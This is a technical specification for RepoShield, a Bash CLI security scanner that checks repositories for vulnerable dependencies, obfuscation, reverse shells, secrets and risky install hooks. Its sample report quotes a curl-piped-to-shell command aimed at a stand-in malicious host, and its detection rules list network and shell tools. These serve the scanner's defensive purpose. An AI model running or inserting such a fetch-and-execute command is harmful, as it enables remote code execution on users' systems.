# RepoShield Technical Specifications

**Status:** Source of truth for the RepoShield CLI
**Derived from:** `RepoShield.md` (Technical Requirement Document, v1.0)
**Target platform:** Unix CLI (macOS / Linux)
**Distribution:** Homebrew tap (`brew install <org>/tap/repo-shield`)

This document restates the requirements in `RepoShield.md` as the authoritative specification for what the CLI does. Where it differs from `RepoShield.md`, this document wins. When the implementation and this document disagree, either fix the code or update this document in the same change. Items still undecided are marked **Open** and tracked in [Section 9](#9-open-questions--gaps). Implementation tasks that cover this spec are in `docs/tasks/`, and their progress is tracked in `docs/progress.md`.

---

## 1. Purpose

RepoShield is a local security scanner for cloned software repositories. It inspects a directory on the user's filesystem for:

- Vulnerable or suspicious third-party dependencies (supply chain risk)
- Malicious or obfuscated code patterns, reverse shells, and embedded secrets
- Dangerous lifecycle or build hooks (for example, `postinstall` scripts that download and execute code)

It is a single-purpose, dependency-light tool. It runs offline except for advisory lookups against the OSV API.

---

## 2. Architecture

The CLI is a modular Bash program. Work flows through four stages:

| Stage                           | Responsibility                                                                                   |
| ------------------------------- | ------------------------------------------------------------------------------------------------ |
| **Ingestion Engine**            | Resolve the target path (absolute or relative). Build the file list while applying ignore rules. |
| **Dispatcher / Classifier**     | Sort each file into one of three categories: manifest, source code, or lifecycle script.         |
| **Analysis Engines**            | Run in parallel on the classified files (see below).                                             |
| **Aggregation & Report Engine** | Normalize severities, render the chosen output format, and compute the exit code.                |

Classification rules: each file goes to at most one category. Manifests and lifecycle files are matched by exact base name at any depth. Source files are matched by extension. A name rule wins over the extension rule, so `setup.py` is lifecycle, not source. A file that matches no rule is not scanned. Source extensions are listed in item 19 and matched case-insensitively.

### 2.1 Analysis engines

| Engine               | Input                    | Responsibilities                                                                                                          |
| -------------------- | ------------------------ | ------------------------------------------------------------------------------------------------------------------------- |
| **SCA Engine**       | Manifests and lock files | Parse dependencies. Query OSV in batches. Normalize results. Detect supply chain anomalies.                               |
| **SAST Engine**      | Source files             | Regex (and AST where feasible) pattern matching. Optional YARA rules. Optional Semgrep rules. Entropy checks for secrets. |
| **Lifecycle Engine** | Package config files     | Extract lifecycle hooks. Flag hooks that make network calls, run shells, or traverse the filesystem.                      |

### 2.2 Dependencies

- **Required:** POSIX utilities (`grep`, `find`, and similar), `jq`, `curl`.
- **Compatibility:** The scripts are Bash 3.2 compatible (the macOS default) and use portable syntax that works with both BSD and GNU tools.
- **Missing required tool:** If `jq` or `curl` is not found, the CLI fails fast with a message and exits `1`.
- **Optional:** `yara`, `semgrep`. If present on the host, they are used automatically. If absent, the scanner runs without them and must not fail.

### 2.3 Security requirements for the tool

RepoShield reads untrusted repositories, so the following are hard requirements:

- **Scanned code is never executed.** No file from the target repository is run, sourced, or evaluated.
- **Paths are handled safely.** Every file path is quoted, and file lists are NUL-delimited. Names with spaces, newlines, quotes, or a leading `-` must be handled correctly.
- **Symlinks are not followed.**
- **Only package names and versions leave the machine.** The only network traffic is the OSV advisory query. Source code, file paths, and file hashes are never sent.
- **No file size limit.** Files are not skipped for size. Binary-file handling is **Open** (see Section 9).

### 2.4 Failure behavior

| Condition                                                | Behavior                                                         | Exit code                     |
| -------------------------------------------------------- | ---------------------------------------------------------------- | ----------------------------- |
| OSV is unreachable, times out, or is rate-limited        | The scan fails. No partial SCA results are reported as complete. | `1`                           |
| Required tool (`jq` or `curl`) is missing                | Fail fast with a message.                                        | `1`                           |
| Target directory is empty or has no supported manifests  | Report zero findings.                                            | `0`                           |
| `-o` output file cannot be written                       | Report the error.                                                | `1`                           |
| One file cannot be read, or one engine fails on one file | Skip that file, record a warning, and continue.                  | Unchanged by the skipped file |

---

## 3. Target Traversal & Filtering

### 3.1 Path handling

- Accept a directory path in any of these forms: `.`, `./relative/path`, `/absolute/path`.
- The path must refer to an existing directory. Otherwise the CLI reports an invalid argument and exits `1`. _(Inferred; see item 52.)_
- Each path is converted to an absolute physical path. Symlinks are resolved, so a symlinked target is reported at its real location. This is the value of `target_directory` (Section 7.1).
- All paths are checked before any scan starts. Every invalid path is reported, and the CLI exits `1` if any path is invalid.
- Multiple paths are accepted. Each path is scanned separately. How multiple results are reported is **Open** (see item 58).

### 3.2 Built-in exclusions

The following directories are always skipped to keep scans fast and reduce false positives:

- `.git/`
- `node_modules/`
- `.venv/`
- `vendor/`
- `target/`
- `dist/`

### 3.3 User-controlled ignores

The scanner reads ignore patterns from these files at the root of the scanned repository:

- `.gitignore`
- `.repo-shield-ignore`

- **`.repo-shield-ignore`** excludes matching paths from the scan.
- **`.gitignore`** does **not** exclude files from the scan. A file that is git-ignored is still scanned, so malicious files cannot hide from the scanner. How `.gitignore` affects the report is **Open** (see item 60).

**`.repo-shield-ignore` syntax** (working assumption until decided; see progress.md TASK_03): gitignore-style globs, one per line. Blank lines and lines starting with `#` are ignored. A leading `!` re-includes a path matched by an earlier line. A trailing `/` matches directories only. A pattern with a `/` in it is anchored to the repository root. Otherwise it matches a name at any depth. `*` and `?` do not match `/`, and `**` matches across directories. An excluded directory excludes everything under it.

**Traversal.** Symlinks are recorded as skipped and never followed. Special files (FIFOs, sockets, devices) are skipped and recorded the same way. Binary files are scanned as text (item 55, still Open).

---

## 4. Software Composition Analysis (SCA)

### 4.1 Supported ecosystems

| Ecosystem               | Files                                                                        |
| ----------------------- | ---------------------------------------------------------------------------- |
| JavaScript / TypeScript | `package.json`, `package-lock.json` (all npm lockfile versions; see item 56) |
| Java / JVM              | `pom.xml` (parsed directly)                                                  |
| Python                  | `Pipfile.lock`, `requirements.txt`                                           |

Version ranges in `package.json` and `requirements.txt` are resolved from the lock file where one exists. Ranges with no lock file are **Open** (see item 57).

Parsing rules (TASK_07). The rules below are working assumptions for items 56, 57, and 63 (see Section 9.10). They are provisional until those items are decided.

| File                | Read                                                                                                                                 | Skipped, with a warning                                                                                  |
| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------- |
| `package-lock.json` | npm lockfile versions 1, 2, and 3. The root entry and `link` entries are not packages.                                               | Unparseable file (no tuples from it).                                                                    |
| `package.json`      | `dependencies`, `devDependencies`, `optionalDependencies`. An exact version (`1.2.3`) is used as written. A range is resolved from a parseable `package-lock.json` in the same directory. | A range with no usable lock file. Tags, URLs, and other non-version specs. Unparseable file.             |
| `pom.xml`           | Direct `<dependency>` elements under `<project><dependencies>`, with a literal `<version>`. Coordinates are `groupId:artifactId`.     | `<dependencyManagement>`, `<profiles>`, `<build>`, and `<exclusions>` are not read. A property version (`${...}`) or no version. Malformed XML. |
| `Pipfile.lock`      | `default` and `develop` sections, with an `==` pin. A name in both sections is kept once.                                            | Entries with no `==` pin (git, path, editable). Unparseable file.                                        |
| `requirements.txt`  | `name==version` pins. Extras, environment markers, comments, `\` continuations, and `--hash` options are handled.                    | Ranges, bare names, URLs, paths. `-r` and `-e` lines, because the dependencies they add are not read. Other options are skipped silently. |

Maven `dependency:list` exports are not read (item 63). A tuple can repeat across files, for example a `package.json` pin and the same package in `package-lock.json`. The OSV step removes duplicates before querying.

### 4.2 Advisory lookup

- Collect `(package name, version)` pairs from the supported manifests and lock files.
- Send them in batches to the OSV batch endpoint: `https://api.osv.dev/v1/querybatch`, using `curl`. Batches are sized to OSV's documented per-request limit.
- Ecosystem identifiers sent to OSV: `npm`, `Maven`, `PyPI`.
- Parse the JSON response with `jq`.
- Each matched advisory becomes a `VULNERABLE_DEPENDENCY` finding. The description includes the package, version, and advisory ID (for example, `GHSA-...`). _(Inferred; see item 53.)_
- Results may be cached in a user directory with a time-to-live. The TTL value is **Open** (see item 61). The cache is not built yet.
- Request and total timeouts are **Open** (see Section 9, item 49). Placeholder values in the implementation: connect 10 s, total 60 s.
- Batch size: placeholder 100 queries per request. OSV's documented per-request limit is not verified yet (item 15).
- Pages: a result with `next_page_token` is queried again with that token until no token is returned. Each request body holds only ecosystem, name, version, and the page token.
- Failure (spec 2.4): unreachable, timed out, HTTP 429, any other non-200 status, or an unparseable or mismatched response fails the whole lookup with exit `1`. No partial result is reported.
- `--offline` (spec 8.2): no request is made, and the missing-lock check in Section 4.3 is skipped too.
- Missing lock (Section 4.3): a `package.json` with no regular `package-lock.json` beside it gets a `MISSING_LOCKFILE` finding at `LOW`. `requirements.txt` and `pom.xml` are not checked yet (no lock convention decided).
- Severity of a matched advisory (item 64): the CVSS v3 base score, computed from the advisory's `CVSS_V3` vector (OSV returns the vector, not the number), mapped to the Section 7.4 bands. The advisory is fetched from `https://api.osv.dev/v1/vulns/{id}` once per scan. CVSS v3.0 and v3.1 are computed. CVSS v4 vectors are not computed.
- An advisory with no CVSS v3 score cannot be mapped. The lookup fails with exit `1` and names the advisory, until item 64 says what to do.

### 4.3 Supply chain anomalies

The scanner flags the following:

- **Typosquatting indicators.** Package names that closely resemble popular packages. **Open:** the similarity method and reference list (items 22 and 23).
- **Missing lock files.** A manifest exists with no matching lock file. Reported as `MISSING_LOCKFILE`.
- **Dependency confusion risk.** Internal-looking or unscoped package names that could resolve from a public registry. **Open:** the detection rule (item 23).

---

## 5. Static Analysis (SAST)

### 5.1 Built-in checks

- **Obfuscated payloads with dynamic execution.** Flag Base64 or hex-encoded content used together with an execution sink such as `eval()`, `Function()`, `exec()`, or `vm.runInNewContext()`.
- **Reverse shells and backdoors.** Flag socket connections that launch a shell binary (`/bin/sh`, `/bin/bash`, `cmd.exe`, `powershell.exe`) bound to a remote host.
- **Secrets.** Flag:
  - High-entropy strings. **Open:** entropy threshold and minimum length (item 24).
  - Private SSH keys
  - Unredacted API credentials, matched by a fixed set of patterns for common formats such as cloud access keys and private key headers. **Open:** the exact pattern list (item 25).

### 5.2 Optional engines

- **YARA.** If the `yara` binary is on `PATH`, run the configured rule set against source files.
- **Semgrep.** If the `semgrep` binary is on `PATH`, run it against source files.

Engine findings are normalized into the same finding schema as built-in checks. Mapping of their severities to the four-level scale is **Open** (item 27).

---

## 6. Lifecycle Script & Build Hook Analysis

### 6.1 Hook extraction

| Ecosystem  | Source                  | Hooks                                                                                 |
| ---------- | ----------------------- | ------------------------------------------------------------------------------------- |
| Node.js    | `package.json`          | `preinstall`, `postinstall`, `prepare`                                                |
| Python     | `setup.py`, `setup.cfg` | Known executing calls, matched statically (for example `os.system` and `subprocess`). |
| Rust / C++ | `build.rs`, Makefiles   | Build-time commands, checked against the same network and shell list as Section 6.2.  |

### 6.2 Heuristic flags

A hook is flagged when its command contains any of the following:

- **Network egress:** `curl`, `wget`, `fetch`, `nc`
- **Binary execution:** `/bin/sh` and similar shells
- **Filesystem traversal** outside the project boundary. **Open:** the boundary rule (item 26).

A flagged `postinstall` that performs a network call and pipes it to a shell is a `CRITICAL` finding (see the example in [Section 7.2](#72-example)).

---

## 7. Findings & Output

### 7.1 Finding schema

Every finding has these fields:

| Field         | Type   | Description                                                                                                                                      |
| ------------- | ------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `category`    | string | Finding type. Known values: `VULNERABLE_DEPENDENCY`, `MALICIOUS_BUILD_HOOK`. Other category names are provisional (see Section 7.4 and item 20). |
| `severity`    | string | One of `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`.                                                                                                      |
| `file`        | string | File path, relative to the target directory. _(Inferred; see item 54.)_                                                                          |
| `description` | string | Human-readable explanation.                                                                                                                      |

`line` is an optional field, present only when the engine knows the line number (item 29). It is included in JSON when present. The other extra fields (`rule_id`, `advisory_id`, `fingerprint`, `schema_version`) are **Open** (item 29).

The JSON report wraps findings in a top-level object:

| Field               | Type    | Description                                 |
| ------------------- | ------- | ------------------------------------------- |
| `target_directory`  | string  | Absolute path of the scanned directory.     |
| `total_findings`    | integer | Count of all findings.                      |
| `critical_findings` | integer | Count of findings with severity `CRITICAL`. |
| `findings`          | array   | Finding objects as above.                   |

### 7.2 Example

```json
{
  "target_directory": "/Users/developer/projects/sample-app",
  "total_findings": 2,
  "critical_findings": 1,
  "findings": [
    {
      "category": "MALICIOUS_BUILD_HOOK",
      "severity": "CRITICAL",
      "file": "package.json",
      "description": "Postinstall script executes dynamic network call: curl -s http://malicious.com | sh"
    },
    {
      "category": "VULNERABLE_DEPENDENCY",
      "severity": "HIGH",
      "file": "package-lock.json",
      "description": "Dependency 'lodash@4.17.15' affected by advisory GHSA-35jh-f384-659f"
    }
  ]
}
```

### 7.3 Output formats

| Format     | Flag value        | Behavior                                   |
| ---------- | ----------------- | ------------------------------------------ |
| ANSI table | `table` (default) | Human-readable, colorized table on stdout. |
| JSON       | `json`            | Schema in Section 7.1.                     |
| SARIF      | `sarif`           | SARIF 2.1.0 document.                      |

Output streams, color handling, and how `table` behaves with `--output` are **Open** (items 31 to 33).

#### SARIF mapping (item 30)

SARIF output is a SARIF 2.1.0 log with one run. Each finding becomes one result.

| Finding field | SARIF 2.1.0 location |
| ------------- | -------------------- |
| `category` | `results[].ruleId`, and `runs[].tool.driver.rules[].id`. There is one rule per category. |
| `description` | `results[].message.text` |
| `severity` | `results[].level`: `CRITICAL` and `HIGH` give `error`, `MEDIUM` gives `warning`, `LOW` gives `note`. Each rule's `properties.security-severity` is the highest severity among its findings: `CRITICAL` 9.0, `HIGH` 7.0, `MEDIUM` 4.0, `LOW` 1.0. Each rule also has `properties.tags: ["security"]`. |
| `category` (rule text) | `rules[].shortDescription.text` is the category name until item 20 gives category descriptions. |
| `file` | `results[].locations[].physicalLocation.artifactLocation.uri`, percent-encoded as a URI reference. |
| `line` (item 29) | `physicalLocation.region.startLine`. `region.snippet.text` is that line of `file` in the target directory. When there is no line, there is no region. When the line is past the end of the file, there is no snippet. |

The output is checked against the SARIF 2.1.0 schema when the test runs with the schema file (see `tests/report_test.sh`). The schema is not bundled with the repository.

### 7.4 Severity

Severity levels, highest to lowest: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`. All engines map their native severities onto this scale.

Default severities (decided, item 21):

| Category                | Condition                                   | Severity                                                                     |
| ----------------------- | ------------------------------------------- | ---------------------------------------------------------------------------- |
| `MALICIOUS_BUILD_HOOK`  | Hook makes a network call piped to a shell  | `CRITICAL`                                                                   |
| `MALICIOUS_BUILD_HOOK`  | Hook makes a network call (no shell pipe)   | `HIGH`                                                                       |
| `REVERSE_SHELL`         | Socket bound to a shell binary, remote host | `CRITICAL`                                                                   |
| `OBFUSCATED_EXECUTION`  | Encoded payload with an execution sink      | `HIGH`                                                                       |
| `VULNERABLE_DEPENDENCY` | Matched OSV advisory                        | From the advisory's CVSS v3 base score: 9.0 to 10.0 `CRITICAL`, 7.0 to 8.9 `HIGH`, 4.0 to 6.9 `MEDIUM`, 0.1 to 3.9 `LOW` (item 64). An advisory with no CVSS v3 score is **Open** (see item 64). |
| `MISSING_LOCKFILE`      | Manifest with no lock file                  | `LOW`                                                                        |

Defaults for `SECRET_EXPOSED`, `TYPOSQUAT_SUSPECT`, `DEPENDENCY_CONFUSION_RISK`, and `PATH_TRAVERSAL_HOOK` are **Open**. Until they are decided, the implementation gives each one `HIGH` (provisional).

Engine severities (item 27, working default, not yet decided): a rule with no native severity is `MEDIUM`. A native level name (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, in any case) maps to itself. Any other native value has no mapping yet and is an error for the engine that produced it.

### 7.5 Suppressing a finding

A single finding can be suppressed by an entry in `.repo-shield-ignore`. Each entry must include a reason. The entry format and whether suppressed findings are counted are **Open** (item 66).

---

## 8. CLI Interface

### 8.1 Synopsis

```
repo-shield [OPTIONS] <path-to-repository> [<path-to-repository>...]
```

### 8.2 Options

| Flag | Long form            | Argument             | Description                                                     |
| ---- | -------------------- | -------------------- | --------------------------------------------------------------- |
| `-f` | `--format`           | `table\|json\|sarif` | Output format. Default: `table`.                                |
| `-o` | `--output`           | `<file>`             | Write findings to a file instead of stdout.                     |
|      | `--fail-on-critical` | none                 | Exit `1` if any `CRITICAL` finding is present.                  |
|      | `--offline`          | none                 | Skip SCA (no OSV queries). SAST and lifecycle checks still run. |
| `-q` | `--quiet`            | none                 | Suppress non-essential output.                                  |
|      | `--verbose`          | none                 | Print additional progress detail.                               |
| `-h` | `--help`             | none                 | Print usage and exit.                                           |
| `-v` | `--version`          | none                 | Print the scanner version and exit.                             |

Argument syntax: `--format=json`, combined short flags (for example `-fjson`), and `--` as the end-of-options marker are all supported.

There is no configuration file.

### 8.3 Exit codes

| Code | Meaning                                                                                                                                         |
| ---- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `0`  | Scan completed. No blocking findings (or `--fail-on-critical` not set). Includes empty directories and directories with no supported manifests. |
| `1`  | `--fail-on-critical` is set and at least one `CRITICAL` finding exists.                                                                         |
| `1`  | Invalid CLI arguments: unknown flag, invalid `--format` value (usage lists the valid values), missing or non-directory path.                    |
| `1`  | Required tool missing, OSV unavailable, or `-o` file cannot be written (see Section 2.4).                                                       |

Without `--fail-on-critical`, findings of any severity do not change the exit code. Exit `1` is shared between findings and errors. Whether to separate them is **Open** (item 59).

---

## 9. Open Questions & Gaps

Items in this section are still unspecified, inconsistent, or inferred. Items answered and written into the spec are marked `Resolved`.

**How to respond:** replace `_TBD_` with your decision, or write `Defer` to leave it open.

**Status key:**

- `Open`: no decision yet
- `Decided`: you have given an answer here, not yet written into the spec
- `Resolved`: the answer is written into the relevant section of this spec
- `Partially resolved`: the main answer is written; a follow-up item is listed in 9.10

Items 1 to 14 are the gaps from the first review of `RepoShield.md`. They are grouped below with the other gaps.

### 9.1 Failure handling & error behavior

1. **OSV unreachable, timing out, or rate-limited.**
   - **Decision:** A: fail the scan and exit `1`. · **Status:** Resolved (Section 2.4)
2. **Required dependency missing (`jq` or `curl`).**
   - **Decision:** A: fail fast with a message and exit `1`. · **Status:** Resolved (Section 2.2)
3. **Empty directory or no supported manifests.**
   - **Decision:** A: exit `0` with zero findings. · **Status:** Resolved (Section 2.4)
4. **`-o` output file cannot be written.**
   - **Decision:** A: exit `1`. · **Status:** Resolved (Section 2.4)
5. **Offline mode.**
   - **Decision:** A: a flag skips SCA. · **Status:** Resolved (`--offline`, Section 8.2)
6. **One engine fails on one file.**
   - **Decision:** A: skip the file, record a warning, and continue. · **Status:** Resolved (Section 2.4)

### 9.2 Security of the tool itself

7. **Scanned code is never executed.**
   - **Decision:** A: confirmed as a hard requirement. · **Status:** Resolved (Section 2.3)
8. **Hostile filenames.**
   - **Decision:** A: all paths are quoted and handled NUL-delimited. · **Status:** Resolved (Section 2.3)
9. **Symlinks.**
   - **Decision:** A: do not follow. · **Status:** Resolved (Section 2.3)
10. **`.gitignore` can hide files from the scan.**
    - **Decision:** A: scan everything except the built-in exclusions. `.gitignore` is used only to reduce noise. · **Status:** Resolved, but see item 60. This conflicts with the TRD's "Respect Local Ignores" requirement.
11. **Data sent to OSV.**
    - **Decision:** A: only package names and versions are sent. · **Status:** Resolved (Section 2.3)
12. **File size limit and binary files.**
    - **Decision:** No limit on file size. Binary-file handling: no answer yet. · **Status:** Partially resolved (see item 55)

### 9.3 Parsing rules

13. **Lock file format versions.**
    - **Decision:** It should be able to support all versions. · **Status:** Partially resolved (see item 56)
14. **Version ranges** in `requirements.txt` and `package.json`.
    - **Decision:** B: resolve ranges from a lock file where one exists. · **Status:** Partially resolved (see item 57)
15. **OSV ecosystem identifiers and batch size.**
    - **Decision:** A: confirmed. · **Status:** Resolved (Section 4.2)
16. **Maven input.**
    - **Decision:** A: parse `pom.xml` directly. Export file format: _TBD_ (not needed under this option). · **Status:** Resolved (Section 4.1; see item 63)
17. **Python `setup.py` inline execution.**
    - **Decision:** A: static matching of known calls. · **Status:** Resolved (Section 6.1)
18. **Makefile and `build.rs` commands.**
    - **Decision:** A: same network and shell list as Section 6.2. · **Status:** Resolved (Section 6.1)
19. **Source code classification.**
    - Extension list: `js`, `mjs`, `cjs`, `jsx`, `ts`, `tsx` (JavaScript / TypeScript); `java`, `kt`, `kts`, `groovy`, `scala` (JVM); `py` (Python); `rs` (Rust); `c`, `h`, `cc`, `cpp`, `cxx`, `hpp`, `hh` (C / C++); `sh`, `bash` (shell scripts). Go is not listed.
    - **Decision:** Source files are classified by file extension, matched case-insensitively (`.PY` and `.py` are both source). Shell scripts are source. Name rules (manifests and lifecycle files) take precedence, so `setup.py` stays lifecycle. · **Status:** Resolved
20. **Finding category names.**
    - **Decision:** _TBD_. Proposed names are used provisionally in Section 7.4 because item 21 was accepted. · **Status:** Open (see item 62)

### 9.4 Detection & severity rules

21. **Default severity per category.**
    - **Decision:** A: use the proposed defaults. · **Status:** Resolved (Section 7.4)
22. **Typosquatting method.**
    - Source of the top-N list: _TBD_
    - **Decision:** _TBD_ · **Status:** Open
23. **Dependency confusion rule.**
    - **Decision:** _TBD_ · **Status:** Open
24. **High-entropy threshold.**
    - Entropy: _TBD_ · Minimum length: _TBD_
    - **Decision:** _TBD_ · **Status:** Open
25. **Secret pattern set.**
    - **Decision:** A: fixed patterns for common credential formats. · **Status:** Partially resolved (pattern list: see item 65)
26. **Filesystem traversal boundary.**
    - **Decision:** _TBD_ · **Status:** Open
27. **Mapping YARA and Semgrep severities** onto the four levels.
    - **Decision:** _TBD_ · **Status:** Open
28. **Suppressing a single finding.**
    - **Decision:** A: per-finding suppression with a required reason, via `.repo-shield-ignore`. · **Status:** Resolved (Section 7.5; entry format: see item 66)

### 9.5 Output & schema

29. **Extra finding fields.**
    - **Decision:** `line` is added as an optional field: the line number in `file`, set when the engine knows it. Used for SARIF regions and snippets (item 30). `rule_id`, `advisory_id`, `fingerprint`, and `schema_version` are still _TBD_. · **Status:** Partially resolved
30. **SARIF mapping.**
    - **Decision:** The mapping in [Section 7.3](#73-output-formats) is used. The user's list (id, messages, severity level, description, security_metadata, code snippets) is covered by the rows there. · **Status:** Resolved
31. **Output streams.**
    - **Decision:** _TBD_ · **Status:** Open
32. **Color.**
    - **Decision:** _TBD_ · **Status:** Open
33. **`table` format with `--output`.**
    - **Decision:** _TBD_ · **Status:** Open
34. **Ordering and deduplication.**
    - **Decision:** _TBD_ · **Status:** Open
35. **Zero findings.**
    - **Decision:** _TBD_ · **Status:** Open
36. **Summary counts.**
    - **Decision:** _TBD_ · **Status:** Open

### 9.6 CLI interface

37. **Argument syntax.**
    - **Decision:** A: support `--format=json`, combined short flags, and `--`. · **Status:** Resolved (Section 8.2)
38. **Multiple target paths.**
    - **Decision:** B: scan each path. · **Status:** Resolved (Sections 3.1 and 8.1; reporting: see item 58)
39. **Verbosity flags.**
    - **Decision:** A: add `--quiet` and `--verbose`. · **Status:** Resolved (Section 8.2)
40. **Config file.**
    - **Decision:** A: none. · **Status:** Resolved (Section 8.2)
41. **Missing or invalid `--format` value.**
    - **Decision:** A: exit `1` with a usage message listing valid values. · **Status:** Resolved (Section 8.3)

### 9.7 Compatibility & build

42. **Minimum Bash version.**
    - **Decision:** A: Bash 3.2 compatible. · **Status:** Resolved (Section 2.2)
43. **GNU versus BSD tools.**
    - **Decision:** A: portable code that works with BSD and GNU tools. · **Status:** Resolved (Section 2.2)
44. **Module packaging.**
    - **Decision:** B: install modules under `libexec` and link the entry point. · **Status:** Resolved (Section 10)
45. **Version source and scheme.**
    - **Decision:** B: semantic versioning, with the version stored in the script. · **Status:** Resolved (Section 10)

### 9.8 Testing, performance & release

46. **Acceptance fixtures.**
    - **Decision:** A: fixtures in `tests/fixtures/`. Owner: _TBD_ · **Status:** Resolved (fixture owner still _TBD_; not yet tracked as a follow-up)
47. **Performance benchmark.**
    - Reference machine: _TBD_ · Benchmark repository: _TBD_
    - **Decision:** _TBD_ · **Status:** Open
48. **OSV result caching.**
    - **Decision:** B: cache in a user directory with a time-to-live. TTL: _TBD_ · **Status:** Partially resolved (see item 61)
49. **Timeouts.**
    - Per-request: _TBD_ · Total: _TBD_
    - **Decision:** _TBD_ · **Status:** Open
    - **Placeholder (TASK_08, provisional):** connect 10 s, total 60 s. See Section 4.2.
50. **Homebrew tap and release details.**
    - Canonical GitHub owner: _TBD_ (the TRD uses both `your-org` and `charlesinto`)
    - Checksum: the formula's `sha256` is the hash of an empty file and must be replaced at release. Confirm: yes / no.
    - Formula test string: the formula expects `RepoShield Security Scanner` in `--help` output. Confirm: yes / no.
    - **Decision:** _TBD_ · **Status:** Open
51. **Current roadmap phase.** Phase: _TBD_
    - **Decision:** _TBD_ · **Status:** Open

### 9.9 Statements inferred during review

These statements are in the spec but are not explicit in `RepoShield.md`. They are marked inline in their sections. Confirm or change each.

52. **Section 3.1:** the path must be an existing directory, otherwise exit `1`.
    - **Decision:** _TBD_ · **Status:** Open
53. **Section 4.2:** the finding description includes the advisory ID.
    - **Decision:** _TBD_ · **Status:** Open
    - **Working assumption (TASK_08, provisional):** the description includes the package, version, ecosystem, and advisory ID. It is built, but no finding is emitted until item 64 is decided.
54. **Section 7.1:** the `file` field is relative to the target directory.
    - **Decision:** _TBD_ · **Status:** Open

### 9.10 Follow-up questions from your decisions

These came out of your answers above. Each needs a decision before the related item can be closed.

55. **Binary files (item 12).** Skip binary files, or scan them?
    - Options: (a) skip; (b) scan.
    - **Decision:** _TBD_ · **Status:** Open
56. **Lock file versions (item 13).** "All versions" needs a concrete list. Which npm lockfile versions (v1, v2, v3), Pipfile.lock formats, and `pom.xml` variants?
    - **Decision:** _TBD_ · **Status:** Open
    - **Working assumption (TASK_07, provisional):** npm lockfile v1, v2, and v3. Pipfile.lock is the single Pipenv format (`default` and `develop`, `==` pins). `pom.xml` is direct dependencies with a literal version (see Section 4.1). Property versions are skipped with a warning, not resolved.
57. **Version ranges with no lock file (item 14).** Options: (a) report as skipped with a `LOW` note; (b) other.
    - **Decision:** _TBD_ · **Status:** Open
    - **Working assumption (TASK_07, provisional):** the entry is skipped and a warning is recorded. The `LOW` note from option (a) is not built yet. It needs a finding category, which depends on item 62. `requirements.txt` ranges follow the same rule.
58. **Multiple paths (item 38).** How are results reported? Options: (a) one combined report; (b) one report per path; (c) other.
    - **Decision:** _TBD_ · **Status:** Open
59. **Shared exit code (Section 8.3).** Exit `1` covers both critical findings and scan errors, so CI can't tell them apart. Options: (a) keep `1` for both; (b) use a separate code for scan errors (for example `2`). Option (b) changes the exit-code table in the TRD.
    - **Decision:** _TBD_ · **Status:** Open
60. **`.gitignore` (item 10).** Your decision conflicts with the TRD's "Respect Local Ignores" requirement. Also, "used only to reduce noise" is not defined. Please confirm the decision and describe what noise reduction means. Options: (a) keep the decision and describe the noise rule; (b) honor `.gitignore` for exclusion, as the TRD says.
    - **Decision:** _TBD_ · **Status:** Open
61. **OSV cache TTL (item 48).** Value: _TBD_
    - **Decision:** _TBD_ · **Status:** Open
    - **Note (TASK_08):** the cache is not built until a TTL is chosen.
62. **Category names (item 20).** Confirm the proposed names. Item 21 is already written using them. Proposed: `SECRET_EXPOSED`, `OBFUSCATED_EXECUTION`, `REVERSE_SHELL`, `TYPOSQUAT_SUSPECT`, `DEPENDENCY_CONFUSION_RISK`, `MISSING_LOCKFILE`, `PATH_TRAVERSAL_HOOK`.
    - **Decision:** _TBD_ · **Status:** Open
63. **Maven exports dropped (item 16).** Under option A, `dependency:list` exports are not read. The TRD lists them. Confirm.
    - **Decision:** _TBD_ · **Status:** Open
    - **Working assumption (TASK_07, provisional):** `dependency:list` exports are not read. This is what the parser does.
64. **OSV severity mapping (Section 7.4).** OSV reports advisory severities in its own format. How do they map to `CRITICAL`, `HIGH`, `MEDIUM`, and `LOW`?
    - **Decision:** The CVSS v3 base score maps to the levels: 9.0 to 10.0 `CRITICAL`, 7.0 to 8.9 `HIGH`, 4.0 to 6.9 `MEDIUM`, 0.1 to 3.9 `LOW`. · **Status:** Partially resolved. Open: an advisory with no CVSS v3 score (CVSS v4 only, or none) has no mapping. The lookup fails for it for now.
65. **Secret pattern list (item 25).** Which patterns, exactly?
    - **Decision:** _TBD_ · **Status:** Open
66. **Suppression entry format (item 28).** What fields does an entry have? Are suppressed findings counted in the totals?
    - **Decision:** _TBD_ · **Status:** Open

---

## 10. Non-Functional Requirements

| Requirement   | Target                                                                                                                         |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| Performance   | Repositories under 100 MB complete in under 10 seconds. Reference machine and benchmark: see item 47.                          |
| Dependencies  | POSIX utilities, `jq`, and `curl` only. `yara` and `semgrep` are optional.                                                     |
| Compatibility | Bash 3.2 compatible. Portable across BSD and GNU tools. macOS (Intel and Apple Silicon); Linux (Ubuntu, Debian, RHEL, Fedora). |
| Exit codes    | As defined in Section 8.3.                                                                                                     |
| Packaging     | Modules installed under `libexec`, with the entry point linked into `bin`.                                                     |
| Versioning    | Semantic versioning. The version string is stored in the script.                                                               |
| Distribution  | Homebrew formula, with automated version updates.                                                                              |

---

## 11. Delivery Roadmap

| Phase | Scope                                                                                                                                        |
| ----- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| 1     | Core shell engine: argument parsing, path traversal, ignore resolution (`.gitignore`, `.repo-shield-ignore`).                                |
| 2     | Multi-ecosystem SCA: parsers for `package-lock.json`, `pom.xml`, `Pipfile.lock`, and OSV batch queries via `curl` and `jq`.                  |
| 3     | SAST and hook analysis: regex and optional YARA/Semgrep rules for obfuscated payloads, reverse shells, and malicious `postinstall` commands. |
| 4     | Packaging: Homebrew formula in the tap, and GitHub Actions for automated releases.                                                           |

Current phase: **Open** (item 51).
